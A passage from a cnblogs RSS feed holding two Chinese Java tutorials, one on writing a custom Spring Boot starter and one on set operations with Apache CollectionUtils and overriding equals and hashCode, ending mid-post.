        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;0.0.1-SNAPSHOT&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependencies&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;自动配置模块的完整POM文件：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;?&lt;/span&gt;&lt;span&gt;xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&lt;/span&gt;&lt;span&gt;?&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;project &lt;/span&gt;&lt;span&gt;xmlns&lt;/span&gt;&lt;span&gt;=&quot;http://maven.apache.org/POM/4.0.0&quot;&lt;/span&gt;&lt;span&gt; xmlns:xsi&lt;/span&gt;&lt;span&gt;=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt;&lt;span&gt;
         xsi:schemaLocation&lt;/span&gt;&lt;span&gt;=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;modelVersion&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;4.0.0&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;modelVersion&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;parent&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework.boot&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;spring-boot-starter-parent&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;2.1.4.RELEASE&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;relativePath&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt; &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; lookup parent from repository &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;parent&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;com.yuanqinnan-starter&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;yuanqinnan-springboot-starter-autoconfigurer&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;0.0.1-SNAPSHOT&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;packaging&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;jar&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;packaging&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;properties&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;java.version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;1.8&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;java.version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;properties&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependencies&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt;引入spring-boot-starter；所有starter的基本配置&lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework.boot&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;spring-boot-starter&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependencies&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;project&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;至此，两个项目基本创建完成，现在我们实现简单的配置。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第五步&lt;/strong&gt;&lt;span&gt;：对自动配置类进行自动配置代码编写&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;先编写一个配置类，用于配置：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
@ConfigurationProperties(prefix = &quot;yuanqinnan.hello&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; HelloProperties {
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;前缀&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt;&lt;span&gt; String prefix;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;后缀&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt;&lt;span&gt; String suffix;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getPrefix() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; prefix;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setPrefix(String prefix) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.prefix =&lt;span&gt; prefix;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getSuffix() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; suffix;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setSuffix(String suffix) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.suffix =&lt;span&gt; suffix;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;再编写一个服务&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; HelloService {

    HelloProperties helloProperties;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; HelloProperties getHelloProperties() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; helloProperties;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setHelloProperties(HelloProperties helloProperties) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.helloProperties =&lt;span&gt; helloProperties;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String sayHello(String name) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; helloProperties.getPrefix() + &quot;-&quot; + name +&lt;span&gt; helloProperties.getSuffix();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后再将这个服务注入组件：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Configuration
@ConditionalOnWebApplication &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;web应用才生效&lt;/span&gt;
@EnableConfigurationProperties(HelloProperties.&lt;span&gt;class&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; HelloServiceAutoConfiguration {

    @Autowired
    HelloProperties helloProperties;
    @Bean
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; HelloService helloService(){
        HelloService service &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; HelloService();
        service.setHelloProperties(helloProperties);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; service;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这个时候我们的自动配置以及写完，还差最后一步，因为SpringBoot读取自动配置是在META-INF的spring.factories文件中，所以我们还要将我们的自动配置类写入其中&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;org.springframework.boot.autoconfigure.EnableAutoConfiguration=\
  com.yuanqinnan.starter.HelloServiceAutoConfiguration&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最后的结构如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428155931539-1642889.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;至此，代码以及编写完成，这个时候我们将其装入仓库中，让其他项目引用&lt;/p&gt;
&lt;h3 class=&quot;md-end-block md-heading&quot;&gt;&lt;span&gt;3.2 使用自定义starter&lt;/span&gt;&lt;/h3&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;创建一个web项目，然后在项目中引入依赖&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt;引入自定义starter&lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;com.yuanqinnan.starter&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;yuanqinnan-springboot-starter&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;1.0-SNAPSHOT&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在application.properties 配置中加上配置：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;yuanqinnan.hello.prefix=早安
yuanqinnan.hello.suffix=晚安&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;加入测试：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Autowired
HelloService helloService;
​
@Test
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; contextLoads() {
    System.out.println(helloService.sayHello(&lt;/span&gt;&quot;世界&quot;&lt;span&gt;));
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这样自定义Starter和引用自定义都已完成，Springboot的核心知识已经总结完成，后面再进行Springboot的一些高级场景整合，如缓存、消息、检索、分布式等。&lt;/p&gt;

</description>
<pubDate>Sun, 28 Apr 2019 13:57:00 +0000</pubDate>
<dc:creator>茶底世界</dc:creator>
<og:description>一、引言 SpringBoot的一大优势就是Starter，由于SpringBoot有很多开箱即用的Starter依赖，使得我们开发变得简单，我们不需要过多的关注框架的配置。 在日常开发中，我们也会自</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yuanqinnan/p/10784508.html</dc:identifier>
</item>
<item>
<title>java代码之美（12）---CollectionUtils工具类 - 雨点的名字</title>
<link>http://www.cnblogs.com/qdhxhz/p/10787130.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/qdhxhz/p/10787130.html</guid>
<description>&lt;center&gt;

&lt;/center&gt;
&lt;p&gt;这篇讲的CollectionUtils工具类是在&lt;code&gt;apache下&lt;/code&gt;的, 而不是springframework下的CollectionUtils。&lt;/p&gt;
&lt;p&gt;个人觉得CollectionUtils在真实项目中,可以使你的代码更加简洁和安全。&lt;/p&gt;
&lt;p&gt;所以需要倒入相关jar包,目前从maven找到最新jar包如下:&lt;/p&gt;
&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;    &amp;lt;dependency&amp;gt;
        &amp;lt;groupId&amp;gt;org.apache.commons&amp;lt;/groupId&amp;gt;
        &amp;lt;artifactId&amp;gt;commons-collections4&amp;lt;/artifactId&amp;gt;
        &amp;lt;version&amp;gt;4.3&amp;lt;/version&amp;gt;
    &amp;lt;/dependency&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;一api常用方法&quot;&gt;&lt;span&gt;一、API常用方法&lt;/span&gt;&lt;/h2&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;        /**
         * 1、除非元素为null，否则向集合添加元素
         */
        CollectionUtils.addIgnoreNull(personList,null);
        /**
         * 2、将两个已排序的集合a和b合并为一个已排序的列表，以便保留元素的自然顺序
         */
        CollectionUtils.collate(Iterable&amp;lt;? extends O&amp;gt; a, Iterable&amp;lt;? extends O&amp;gt; b)
        /**
         * 3、将两个已排序的集合a和b合并到一个已排序的列表中，以便保留根据Comparator c的元素顺序。
         */
        CollectionUtils.collate(Iterable&amp;lt;? extends O&amp;gt; a, Iterable&amp;lt;? extends O&amp;gt; b, Comparator&amp;lt;? super O&amp;gt; c)
        /**
         * 4、返回该个集合中是否含有至少有一个元素
         */
        CollectionUtils.containsAny(Collection&amp;lt;?&amp;gt; coll1, T... coll2)
        /**
         * 5、如果参数是null，则返回不可变的空集合，否则返回参数本身。（很实用 ,最终返回List EMPTY_LIST = new EmptyList&amp;lt;&amp;gt;()）
         */
        CollectionUtils.emptyIfNull(Collection&amp;lt;T&amp;gt; collection)
        /**
         * 6、空安全检查指定的集合是否为空
         */
        CollectionUtils.isEmpty(Collection&amp;lt;?&amp;gt; coll)
        /**
         * 7、 空安全检查指定的集合是否为空。
         */
        CollectionUtils.isNotEmpty(Collection&amp;lt;?&amp;gt; coll)
        /**
         * 8、反转给定数组的顺序。
         */
        CollectionUtils.reverseArray(Object[] array);
        /**
         * 9、差集
         */
        CollectionUtils.subtract(Iterable&amp;lt;? extends O&amp;gt; a, Iterable&amp;lt;? extends O&amp;gt; b)
        /**
         * 10、并集
         */
        CollectionUtils.union(Iterable&amp;lt;? extends O&amp;gt; a, Iterable&amp;lt;? extends O&amp;gt; b)
        /**
         * 11、交集
         */
        CollectionUtils.intersection(Collection a, Collection b)
        /**
         *12、 交集的补集（析取）
         */
        CollectionUtils.disjunction(Collection a, Collection b)&lt;/code&gt;
&lt;/pre&gt;

&lt;h2 id=&quot;二非对象集合交并差处理&quot;&gt;&lt;span&gt;二、非对象集合交、并、差处理&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;对于集合取交集、并集的处理其实有很多种方式,这里就介绍3种&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;第一种 是CollectionUtils工具类&lt;/li&gt;
&lt;li&gt;第二种 是List自带方法&lt;/li&gt;
&lt;li&gt;第三种 是JDK1.8 stream 新特性&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;collectionutils工具类&quot;&gt;1、CollectionUtils工具类&lt;/h4&gt;
&lt;p&gt;下面对于基本数据(包扩String)类型中的集合进行demo示例。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt; public static void main(String[] args) {
        String[] arrayA = new String[] { &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;};
        String[] arrayB = new String[] { &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot; };
        List&amp;lt;String&amp;gt; listA = Arrays.asList(arrayA);
        List&amp;lt;String&amp;gt; listB = Arrays.asList(arrayB);

        //1、并集 union
        System.out.println(CollectionUtils.union(listA, listB));
        //输出: [1, 2, 3, 4, 5, 6]

        //2、交集 intersection
        System.out.println(CollectionUtils.intersection(listA, listB));
        //输出:[3, 4]

        //3、交集的补集（析取）disjunction
        System.out.println(CollectionUtils.disjunction(listA, listB));
        //输出:[1, 2, 5, 6]

        //4、差集（扣除）
        System.out.println(CollectionUtils.subtract(listA, listB));
        //输出:[1, 2]
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;list自带方法&quot;&gt;2、List自带方法&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;    public static void main(String[] args) {
        String[] arrayA = new String[] { &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;};
        String[] arrayB = new String[] { &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot; };
        List&amp;lt;String&amp;gt; listA = Arrays.asList(arrayA);
        List&amp;lt;String&amp;gt; listB = Arrays.asList(arrayB);

        //1、交集
        List&amp;lt;String&amp;gt;  jiaoList = new ArrayList&amp;lt;&amp;gt;(listA);
        jiaoList.retainAll(listB);
        System.out.println(jiaoList);
        //输出:[3, 4]

       //2、差集
        List&amp;lt;String&amp;gt;  chaList = new ArrayList&amp;lt;&amp;gt;(listA);
        chaList.removeAll(listB);
        System.out.println(chaList);
        //输出:[1, 2]

        //3、并集 (先做差集再做添加所有）
        List&amp;lt;String&amp;gt;  bingList = new ArrayList&amp;lt;&amp;gt;(listA);
        bingList.removeAll(listB); // bingList为 [1, 2]
        bingList.addAll(listB);  //添加[3,4,5,6]
        System.out.println(bingList);
        //输出:[1, 2, 3, 4, 5, 6]
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt; : &lt;strong&gt;intersection和retainAll的差别&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;要注意的是它们的返回类型是不一样的,&lt;code&gt;intersection&lt;/code&gt;返回的是一个新的List集合，而&lt;code&gt;retainAll&lt;/code&gt;返回是Bollean类型那就说明retainAll方法是对原有集合进行处理再返回原有集合,会改变原有集合中的内容。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;个人观点&lt;/code&gt;：1、从性能角度来考虑的话,List自带会高点,因为它不用再创建新的集合。2、需要注意的是：因为retainAll因为会改变原有集合,所以该集合需要多次使用就不适合用retainAll。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;: Arrays.asList将数组转集合不能进行add和remove操作。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;原因&lt;/code&gt;：调用Arrays.asList()生产的List的add、remove方法时报异常，这是由&lt;code&gt;Arrays.asList() 返回的市Arrays的内部类ArrayList， 而不是java.util.ArrayList&lt;/code&gt;。Arrays的内部类ArrayList和java.util.ArrayList都是继承AbstractList，remove、add等方法AbstractList中是默认throw UnsupportedOperationException而且不作任何操作。java.util.ArrayList重新了这些方法而Arrays的内部类ArrayList没有重新，所以会抛出异常。&lt;/p&gt;
&lt;p&gt;所以正确做法如下&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;        String[] array = {&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;};
        List&amp;lt;String&amp;gt; list = Arrays.asList(array);
        List arrList = new ArrayList(list);
        arrList.add(&quot;6&quot;);&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;jdk1.8-stream-新特性&quot;&gt;3、JDK1.8 stream 新特性&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;    public static void main(String[] args) {
        String[] arrayA = new String[] { &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;};
        String[] arrayB = new String[] { &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot; };
        List&amp;lt;String&amp;gt; listA = Arrays.asList(arrayA);
        List&amp;lt;String&amp;gt; listB = Arrays.asList(arrayB);

        // 交集
        List&amp;lt;String&amp;gt; intersection = listA.stream().filter(item -&amp;gt; listB.contains(item)).collect(toList());
        System.out.println(intersection);
        //输出:[3, 4]

        // 差集 (list1 - list2)
        List&amp;lt;String&amp;gt; reduceList = listA.stream().filter(item -&amp;gt; !listB.contains(item)).collect(toList());
        System.out.println(reduceList);
        //输出:[1, 2]

        // 并集 （新建集合:1、是因为不影响原始集合。2、Arrays.asList不能add和remove操作。
        List&amp;lt;String&amp;gt; listAll = listA.parallelStream().collect(toList());
        List&amp;lt;String&amp;gt; listAll2 = listB.parallelStream().collect(toList());
        listAll.addAll(listAll2);
        System.out.println(listAll);
        //输出:[1, 2, 3, 4, 3, 4, 5, 6]

        // 去重并集 
        List&amp;lt;String&amp;gt; list =new ArrayList&amp;lt;&amp;gt;(listA);
        list.addAll(listB);
        List&amp;lt;String&amp;gt; listAllDistinct = list.stream().distinct().collect(toList());
        System.out.println(listAllDistinct);
        //输出:[1, 2, 3, 4, 5, 6]
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;总结&lt;/code&gt; ： 这三种我还是&lt;code&gt;最喜欢第一种方式&lt;/code&gt;，因为第二种还需要确定该集合是否被多次调用。第三种可读性不高。&lt;/p&gt;

&lt;h2 id=&quot;三对象集合交并差处理&quot;&gt;&lt;span&gt;三、对象集合交、并、差处理&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;因为对象的equels比较是比较两个对象的内存地址，所以除非是同一对象，否则equel返回永远是false。&lt;/p&gt;
&lt;p&gt;但我们实际开发中 在我们的业务系统中判断对象时有时候需要的不是一种严格意义上的相等，而是一种业务上的对象相等。在这种情况下，原生的equals方法就不能满足我们的需求了，所以这个时候我们需要重写equals方法。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;说明&lt;/code&gt; :String为什么可以使用equels方法为什么只要字符串相等就为true,那是因为String类重写了equal和hashCode方法，比较的是值。&lt;/p&gt;
&lt;h4 id=&quot;person对象&quot;&gt;1、Person对象&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class Person {
    private String name;
    private Integer age;
    public Person(String name, Integer age) {
        this.name = name;
        this.age = age;
    }
    /**
     * 为什么重写equals方法一定要重写hashCode方法下面也会讲
     */
    @Override
    public int hashCode() {
        String result = name + age;
        return result.hashCode();
    }
    /**
     * 重写 equals 方法 根据name和age都相同那么对象就默认相同
     */
    @Override
    public boolean equals(Object obj) {
        Person u = (Person) obj;
        return this.getName().equals(u.getName()) &amp;amp;&amp;amp; (this.age.equals(u.getAge()));
    }
    /**
     * 重写 toString 方法
     */
    @Override
    public String toString() {
        return &quot;Person{&quot; +
                &quot;name='&quot; + name + '\'' +
                &quot;, age=&quot; + age +
                '}';
    }
  }&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;测试&quot;&gt;2、测试&lt;/h4&gt;
&lt;p&gt;这里根据name和age都相同那么就默认相同对象。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;    public static void main(String[] args) {

        List&amp;lt;Person&amp;gt; personList = Lists.newArrayList();
        Person person1 = new Person(&quot;小小&quot;,3);
        Person person2 = new Person(&quot;中中&quot;,4);
        personList.add(person1);
        personList.add(person2);

        List&amp;lt;Person&amp;gt; person1List = Lists.newArrayList();
        Person person3 = new Person(&quot;中中&quot;,4);
        Person person4 = new Person(&quot;大大&quot;,5);
        person1List.add(person3);
        person1List.add(person4);
        /**
         * 1、差集
         */
        System.out.println(CollectionUtils.subtract(personList, person1List));
        //输出:[Person{name='小小', age=3}]

        /**
         * 2、并集
         */
        System.out.println(CollectionUtils.union(personList, person1List));
        //输出:[Person{name='小小', age=3}, Person{name='中中', age=4}, Person{name='大大', age=5}]

        /**
         * 3、交集
         */
        System.out.println(CollectionUtils.intersection(personList, person1List));
        //输出:[Person{name='中中', age=4}]

        /**
         * 4、交集的补集（析取）
         */
        System.out.println(CollectionUtils.disjunction(personList, person1List));
        //输出:[Person{name='小小', age=3}, Person{name='大大', age=5}]
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其它两种方式就不在测了，因为都一样。&lt;/p&gt;

&lt;h2 id=&quot;四为什么重写equels方法一定要重写hashcode方法&quot;&gt;&lt;span&gt;四、为什么重写equels方法一定要重写hashCode方法&lt;/span&gt;&lt;/h2&gt;
&lt;h4 id=&quot;源码&quot;&gt;1、源码&lt;/h4&gt;
&lt;p&gt;其实上面的Person类我可以只重写equels方法而不写hashCode方法,一样能达到上面的效果。但为什么还是建议写上呢？官方的说法是:&lt;code&gt;对象的equals方法被重写，那么对象的hashCode()也尽量重写&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;重写equals()方法就必须重写hashCode()方法的原因，从源头Object类讲起就更好理解了。&lt;/p&gt;
&lt;p&gt;先来看Object关于hashCode()和equals()的源码：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;  public native int hashCode();
        
  public boolean equals(Object obj) {
           return (this == obj);
      }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;光从代码中我们可以知道，&lt;code&gt;hashCode()方法是一个本地native方法&lt;/code&gt;，返回的是对象引用中存储的对象的内存地址。而equals方法是利用==来比较的也是对象的内存地址。从上边我们可以看出，hashCode方法和equals方法是一致的。还有最关键的一点，我们来看Object类中关于hashCode()方法的注释：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;  1.在 Java 应用程序执行期间，在对同一对象多次调用 hashCode 方法时，必须一致地返回相同的整数，前提是将对象进行 equals 比较时所用的信息没有被修改。    
  2.如果根据 equals(Object) 方法，两个对象是相等的，那么对这两个对象中的每个对象调用 hashCode 方法都必须生成相同的整数结果。    
  3.如果根据 equals(java.lang.Object) 方法，两个对象不相等，那么对这两个对象中的任一对象上调用 hashCode 方法不 要求一定生成不同的整数结果。
